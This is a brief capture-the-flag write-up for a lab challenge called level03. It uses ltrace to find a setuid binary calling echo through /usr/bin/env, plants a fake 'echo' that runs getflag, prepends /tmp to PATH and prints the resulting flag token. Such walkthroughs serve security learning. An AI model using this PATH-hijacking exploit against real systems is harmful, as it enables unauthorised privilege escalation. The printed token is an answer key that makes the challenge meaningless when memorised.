we can see that in home directory of Level03 there is executable file with name level03 that has permission of the user flag03

$> ltrace ./level03
[...]
system("/usr/bin/env echo Exploit me"Exploit me
[...]

ltrace : intercepts and records dynamic library calls which are called by an executed process and the signals received by that process.

system("/usr/bin/env" echo) that mean Running a echo through /usr/bin/env has the benefit of looking for whatever the default version 
of the program is in your current environment.

so we gonna try to create a fake echo.

$>echo getflag >echo && chmod 777 echo

and then add the path of our fake echo so that level03 goona use our fake echo instead.

$>export PATH="/tmp:$PATH"

$> ./level03
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
